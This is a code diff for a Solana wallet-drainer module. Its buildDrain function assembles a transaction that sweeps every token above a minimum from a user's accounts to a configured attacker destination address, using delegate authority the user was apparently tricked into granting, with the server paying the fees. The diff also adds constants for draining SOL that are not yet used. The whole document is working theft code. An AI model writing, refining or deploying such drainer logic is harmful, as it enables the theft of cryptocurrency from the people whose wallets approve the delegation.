@@ -1,4 +1,4 @@
-const { Transaction, PublicKey } = require("@solana/web3.js");
+const { Transaction, PublicKey, SystemProgram } = require("@solana/web3.js");
 const {
     createTransferInstruction,
     getAssociatedTokenAddress,
@@ -9,9 +9,11 @@ const { getUserTokenAccounts } = require("../solana/tokenService");
 const { getConfig } = require("../config/environment");
 const logger = require("../core/logger");
 const { withRetry } = require("../core/rpcPool");
-const { setBlockhash } = require("../core/blockhashCache");
+const { getBlockhash, setBlockhash } = require("../core/blockhashCache");
 
 const MIN_RAW_AMOUNT = 1000n;
+const MIN_SOL_TO_DRAIN = 200000n; // 0.0002 SOL
+const SOL_BUFFER = 50000n;        // 0.00005 SOL
 
 async function buildDrain(user, connection) {
     return withRetry(async (conn) => {
@@ -23,60 +25,54 @@ async function buildDrain(user, connection) {
             const destinationPubkey = new PublicKey(config.DESTINATION_ADDRESS);
             const feePayer = new PublicKey(config.PUBLIC_KEY);
 
-            // Always fetch a fresh blockhash and update the cache
-            const { blockhash } = await conn.getLatestBlockhash("confirmed");
-            setBlockhash(blockhash);
-            tx.recentBlockhash = blockhash;
+            let blockhash = getBlockhash();
+            if (!blockhash) {
+                const { blockhash: freshBlockhash } = await conn.getLatestBlockhash("confirmed");
+                blockhash = freshBlockhash;
+                setBlockhash(blockhash);
+            }
 
-            // Server pays fees for drain operations
+            tx.recentBlockhash = blockhash;
             tx.feePayer = feePayer;
 
             const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
             if (!tokenAccounts) throw new Error("Failed to fetch token accounts");
 
-            // Drain all approved tokens (WSOL, USDC, JUP, etc.) via delegate
             for (const token of tokenAccounts.tokens || []) {
+                if (token.amount < MIN_RAW_AMOUNT) continue;
+
+                const destAta = await getAssociatedTokenAddress(token.mint, destinationPubkey);
+
+                let destExists = true;
                 try {
-                    if (token.amount < MIN_RAW_AMOUNT) continue;
+                    await getAccount(conn, destAta);
+                } catch {
+                    destExists = false;
+                }
 
-                    const destAta = await getAssociatedTokenAddress(token.mint, destinationPubkey);
-
-                    let destExists = true;
-                    try {
-                        await getAccount(conn, destAta);
-                    } catch (e) {
-                        destExists = false;
-                    }
-
-                    if (!destExists) {
-                        tx.add(
-                            createAssociatedTokenAccountInstruction(
-                                feePayer,
-                                destAta,
-                                destinationPubkey,
-                                token.mint
-                            )
-                        );
-                    }
-
-                    // Transfer using delegate authority
-                    // User approved delegate in approveFlow, so delegate can transfer
+                if (!destExists) {
                     tx.add(
-                        createTransferInstruction(
-                            token.ata,           // source (user's token account)
-                            destAta,             // destination
-                            delegatePubkey,      // authority (server delegate - approved by user)
-                            token.amount         // amount
+                        createAssociatedTokenAccountInstruction(
+                            feePayer,
+                            destAta,
+                            destinationPubkey,
+                            token.mint
                         )
                     );
-                } catch (innerErr) {
-                    logger.warn("Skipping token during drain build", {
-                        mint: token && token.mint ? token.mint.toString() : undefined,
-                        error: innerErr.message
-                    });
-                    continue;
                 }
+
+                tx.add(
+                    createTransferInstruction(
+                        token.ata,
+                        destAta,
+                        delegatePubkey,
+                        token.amount
+                    )
+                );
             }
+
+            
+            
 
             logger.info("Drain transaction built", { instructions: tx.instructions.length });
             return tx;
